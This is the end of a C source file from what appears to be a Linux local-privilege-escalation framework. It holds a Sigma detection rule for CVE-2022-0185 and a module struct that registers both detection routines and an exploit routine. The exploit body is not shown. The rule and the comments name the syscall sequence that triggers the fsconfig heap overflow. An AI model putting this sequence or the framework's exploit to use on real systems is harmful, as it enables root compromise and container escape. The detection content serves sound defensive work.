    "  user_ns+mount_ns, calls fsopen() then fsconfig(FSCONFIG_SET_STRING)\n"
    "  repeatedly. The repeated FSCONFIG_SET_STRING on the same option is\n"
    "  what drives the source-buffer overflow. False positives: legitimate\n"
    "  fsopen-based mounts inside containers (rare in unprivileged paths).\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  unshare_userns: {type: 'SYSCALL', syscall: 'unshare'}\n"
    "  fsopen: {type: 'SYSCALL', syscall: 'fsopen'}\n"
    "  fsconfig_set_string: {type: 'SYSCALL', syscall: 'fsconfig', a1: 1}\n"
    "  not_root: {auid|expression: '!= 0'}\n"
    "  condition: unshare_userns and fsopen and fsconfig_set_string and not_root\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1611, cve.2022.0185]\n";

const struct iamroot_module fuse_legacy_module = {
    .name           = "fuse_legacy",
    .cve            = "CVE-2022-0185",
    .summary        = "legacy_parse_param fsconfig heap OOB → container-escape LPE",
    .family         = "fuse_legacy",
    .kernel_range   = "5.1 ≤ K, fixed mainline 5.16.2; backports: 5.16.2 / 5.15.14 / 5.10.91 / 5.4.171",
    .detect         = fuse_legacy_detect,
    .exploit        = fuse_legacy_exploit,
    .mitigate       = NULL,
    .cleanup        = NULL,
    .detect_auditd  = fuse_legacy_auditd,
    .detect_sigma   = fuse_legacy_sigma,
    .detect_yara    = NULL,
    .detect_falco   = NULL,
};

void iamroot_register_fuse_legacy(void)
{
    iamroot_register(&fuse_legacy_module);
}
